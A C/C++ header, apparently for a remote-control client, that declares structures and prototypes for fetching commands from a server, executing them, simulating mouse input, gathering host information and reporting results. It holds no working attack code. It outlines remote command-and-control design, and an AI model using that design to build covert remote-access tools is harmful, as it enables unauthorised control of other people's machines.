#pragma once

typedef struct _hostinfo
{
	// `rc_host_name` varchar(50) DEFAULT NULL,
	// `rc_host_os` varchar(30) DEFAULT NULL,
	char rc_host_name[500];
	char rc_host_os[30];
}hostinfo;

typedef struct _cmdinfo
{
		//`cmd_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
		//`cmd_type` int(11) NOT NULL,
		//`cmd_time` datetime NOT NULL,
		//`cmd_content` text NOT NULL,
		//`cmd_status` tinyint(4) NOT NULL,
	char cmd_id[20];
	char cmd_type[4];
	string cmd_content;
}cmdinfo;

typedef struct _mousecommand
{
	int action;
	int x_pos;
	int y_pos;
}mousecommand;

extern  char userName[20];
extern char hostid[20];
extern int delay;
extern hostinfo pHI;
extern char online_post_data[1024];
//extern char getcmd_post_data[1024];
extern char cookie_data[1024];
extern bool set_cookie;
//extern char server_addr[50];
extern char server_addr[255];

//这些用时计算代码执行时间
extern long start_time;
extern long finish_time;
extern double totaltime;
void startclock();
void stopclock(char *tips);


void ReceiveCommand(void *args);
void RunCmd(void *cmd);
bool GetHostInfo(hostinfo &pHI);
void SubmitResult(cmdinfo *pci,const char *result);
bool AnalyzeCommand(string cmd,cmdinfo *ci);
bool AnalyzeMouseCommand(string cmd,mousecommand &mscmd);
void AnalyzeJumpPage(HttpMessenger *hm_cmd_receiver);
void CMDExecute(void *temp);
void Base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len,string &ret);
void Base64Decode(std::string const& encoded_string,string &ret);
void PathDecode(string base64_json,string &path_out);
void Replace_plus(string &str);
bool InitialStruct();
void CleanStruct();
void GetCustomServerIP();
void SaveCustomServerIP(char *pCustomIP);
void GetCustomUserName();
void SaveCustomUserName(char *pUserName);